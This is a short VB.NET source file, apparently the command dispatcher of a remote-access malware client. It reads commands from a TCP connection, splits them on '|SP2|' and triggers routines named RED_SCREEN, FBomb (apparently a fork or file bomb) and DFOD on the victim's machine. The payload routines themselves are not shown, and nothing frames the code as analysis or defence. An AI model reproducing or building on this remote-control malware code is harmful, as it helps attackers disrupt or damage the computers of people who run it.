Imports System.Net.Sockets

Public Class MainCL
    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
        Dim h As String() = Split(l, "|SP2|")

        If h(1) = "|RDSC|" Then

            Await Task.Run(Sub() V1.RED_SCREEN())


            '   ElseIf h(1) = "|GETTASKSNOTOLD|" Then

            '   Await Task.Run(Sub() TasksGot(k, "|OLD|"))
        ElseIf h(1) = "|FBOMB|" Then

            Await Task.Run(Sub() V2.FBomb(h(2)))

        ElseIf h(1) = "|DFOD|" Then
            If h(2) = 1 Then
                Await Task.Run(Sub() V3.DFOD(True))
            Else
                Await Task.Run(Sub() V3.DFOD(False))
            End If

        End If
    End Sub
End Class
